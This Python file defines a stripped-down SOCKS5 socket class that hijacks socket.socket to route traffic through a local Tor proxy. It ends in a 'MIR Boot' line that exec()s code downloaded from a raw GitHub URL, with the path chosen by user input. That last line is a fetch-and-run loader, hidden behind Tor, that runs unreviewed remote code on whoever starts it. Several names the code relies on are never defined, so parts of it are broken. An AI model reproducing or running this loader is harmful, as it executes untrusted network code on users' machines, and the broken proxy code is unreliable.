import functools
import socket
import struct
from urllib.request import Request,urlopen

def set_self_blocking(function):
    @functools.wraps(function)
    def wrapper(*args, **kwargs):
        self = args[0]
        try:
            _is_blocking = self.gettimeout()
            if _is_blocking == 0:
                self.setblocking(True)
            return function(*args, **kwargs)
        except Exception as e:
            raise
        finally:
            if _is_blocking == 0:
                self.setblocking(False)
    return wrapper
class _BaseSocket(socket.socket):
    def __init__(self, *pos, **kw):
        _orig_socket.__init__(self, *pos, **kw)
        self._savedmethods = dict()
        for name in self._savenames:
            self._savedmethods[name] = getattr(self, name)
            delattr(self, name)
    _savenames = list()
class torsoc(_BaseSocket):
    init = False
    def get(url):
        if not torsoc.init:
            global _orgsocket,_orig_socket,socket
            _orgsocket = _orig_socket = socket.socket
            socket.socket=torsoc
            torsoc.init = True
        return urlopen(Request(url)).read().decode('utf-8')
    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,proto=0, *args, **kwargs):
        super(torsoc, self).__init__(family, type, proto, *args, **kwargs)
        self._proxyconn = None
        self.proxy = (2,'127.0.0.1',9150,True,None,None)
        self.proxy_sockname = None
        self.proxy_peername = None
        self._timeout = None
    def _readall(self, file, count):
        data = b""
        while len(data) < count:
            d = file.read(count - len(data))
            if not d:
                raise GeneralProxyError("Connection closed unexpectedly")
            data += d
        return data
    def settimeout(self, timeout):
        self._timeout = timeout
        try:
            peer = self.get_proxy_peername()
            super(torsoc, self).settimeout(self._timeout)
        except socket.error:
            pass
    def gettimeout(self):
        return self._timeout
    def setblocking(self, v):
        if v:
            self.settimeout(None)
        else:
            self.settimeout(0.0)
    def bind(self, *pos, **kw):
        (proxy_type, proxy_addr, proxy_port, rdns, username,
         password) = self.proxy
        if not proxy_type or self.type != socket.SOCK_DGRAM:
            return _orig_socket.bind(self, *pos, **kw)
        if self._proxyconn:
            raise socket.error(EINVAL, "Socket already bound to an address")
        super(torsoc, self).bind(*pos, **kw)
        _, port = self.getsockname()
        dst = ("0", port)
        self._proxyconn = _orig_socket()
        proxy = self._proxy_addr()
        self._proxyconn.connect(proxy)
        UDP_ASSOCIATE = b"\x03"
        _, relay = self._SOCKS5_request(self._proxyconn, UDP_ASSOCIATE, dst)
        host, _ = proxy
        _, port = relay
        super(torsoc, self).connect((host, port))
        super(torsoc, self).settimeout(self._timeout)
        self.proxy_sockname = ("0.0.0.0", 0)
    def sendto(self, bytes, *args, **kwargs):
        if self.type != socket.SOCK_DGRAM:
            return super(torsoc, self).sendto(bytes, *args, **kwargs)
        if not self._proxyconn:
            self.bind(("", 0))
        address = args[-1]
        flags = args[:-1]
        header = BytesIO()
        RSV = b"\x00\x00"
        header.write(RSV)
        STANDALONE = b"\x00"
        header.write(STANDALONE)
        self._write_SOCKS5_address(address, header)
        sent = super(torsoc, self).send(header.getvalue() + bytes, *flags,**kwargs)
        return sent - header.tell()
    def send(self, bytes, flags=0, **kwargs):
        if self.type == socket.SOCK_DGRAM:
            return self.sendto(bytes, flags, self.proxy_peername, **kwargs)
        else:
            return super(torsoc, self).send(bytes, flags, **kwargs)
    def recvfrom(self, bufsize, flags=0):
        if self.type != socket.SOCK_DGRAM:
            return super(torsoc, self).recvfrom(bufsize, flags)
        if not self._proxyconn:
            self.bind(("", 0))
        buf = BytesIO(super(torsoc, self).recv(bufsize + 1024, flags))
        buf.seek(2, SEEK_CUR)
        frag = buf.read(1)
        if ord(frag):
            raise NotImplementedError("Received UDP packet fragment")
        fromhost, fromport = self._read_SOCKS5_address(buf)
        if self.proxy_peername:
            peerhost, peerport = self.proxy_peername
            if fromhost != peerhost or peerport not in (0, fromport):
                raise socket.error(EAGAIN, "Packet filtered")
        return (buf.read(bufsize), (fromhost, fromport))
    def recv(self, *pos, **kw):
        bytes, _ = self.recvfrom(*pos, **kw)
        return bytes
    def close(self):
        if self._proxyconn:
            self._proxyconn.close()
        return super(torsoc, self).close()
    def get_proxy_peername(self):
        return self.getpeername()
    getproxypeername = get_proxy_peername
    def _negotiate_SOCKS5(self, *dest_addr):
        CONNECT = b"\x01"
        self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(self, CONNECT, dest_addr)
    def _SOCKS5_request(self, conn, cmd, dst):
        proxy_type, addr, port, rdns, username, password = self.proxy
        writer = conn.makefile("wb")
        reader = conn.makefile("rb", 0)
        try:
            writer.write(b"\x05\x01\x00")
            writer.flush()
            chosen_auth = self._readall(reader, 2)
            writer.write(b"\x05" + cmd + b"\x00")
            resolved = self._write_SOCKS5_address(dst, writer)
            writer.flush()
            resp = self._readall(reader, 3)
            status = ord(resp[1:2])
            bnd = self._read_SOCKS5_address(reader)
            super(torsoc, self).settimeout(self._timeout)
            return (resolved, bnd)
        finally:
            reader.close()
            writer.close()
    def _write_SOCKS5_address(self, addr, file):
        host, port = addr
        proxy_type, _, _, rdns, username, password = self.proxy
        family_to_byte = {socket.AF_INET: b"\x01", socket.AF_INET6: b"\x04"}
        for family in (socket.AF_INET, socket.AF_INET6):
            try:
                addr_bytes = socket.inet_pton(family, host)
                file.write(family_to_byte[family] + addr_bytes)
                host = socket.inet_ntop(family, addr_bytes)
                file.write(struct.pack(">H", port))
                return host, port
            except socket.error:
                continue
        host_bytes = host.encode("idna")
        file.write(b"\x03" + chr(len(host_bytes)).encode() + host_bytes)
        file.write(struct.pack(">H", port))
        return host, port
    def _read_SOCKS5_address(self, file):
        atyp = self._readall(file, 1)
        if atyp == b"\x01":
            addr = socket.inet_ntoa(self._readall(file, 4))
        elif atyp == b"\x03":
            length = self._readall(file, 1)
            addr = self._readall(file, ord(length))
        elif atyp == b"\x04":
            addr = socket.inet_ntop(socket.AF_INET6, self._readall(file, 16))
        else:
            raise GeneralProxyError("SOCKS5 proxy server sent invalid data")
        port = struct.unpack(">H", self._readall(file, 2))[0]
        return addr, port
    @set_self_blocking
    def connect(self, dest_pair, catch_errors=None):
        dest_addr, dest_port = dest_pair
        if self.type == socket.SOCK_DGRAM:
            if not self._proxyconn:
                self.bind(("", 0))
            dest_addr = socket.gethostbyname(dest_addr)
            self.proxy_peername = (dest_addr, dest_port)
            return
        (proxy_type, proxy_addr, proxy_port, rdns, username,
         password) = self.proxy
        super(torsoc, self).settimeout(self._timeout)
        proxy_addr = self._proxy_addr()
        try:
            super(torsoc, self).connect(proxy_addr)
        except socket.error as error:
            self.close()
            if not catch_errors:
                proxy_addr, proxy_port = proxy_addr
                proxy_server = "{}:{}".format(proxy_addr, proxy_port)
                printable_type = PRINTABLE_PROXY_TYPES[proxy_type]
                msg = "Error connecting to {} proxy {}".format(printable_type,proxy_server)
                raise ProxyConnectionError(msg, error)
            else:
                raise error
        try:
            self._negotiate_SOCKS5(dest_addr, dest_port)
        except socket.error as error:
            if not catch_errors:
                self.close()
                raise GeneralProxyError("Socket error", error)
            else:
                raise error
        except ProxyError:
            self.close()
            raise
    @set_self_blocking
    def connect_ex(self, dest_pair):
        try:
            self.connect(dest_pair, catch_errors=True)
            return 0
        except OSError as e:
            if e.errno:
                return e.errno
            else:
                raise
    def _proxy_addr(self):
        (proxy_type, proxy_addr, proxy_port, rdns, username,
         password) = self.proxy
        proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)
        return proxy_addr, proxy_port
exec(torsoc.get('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('MIR Boot 1.03\nWelcome ' + torsoc.get('https://api.ipify.org/') + '\n>')))

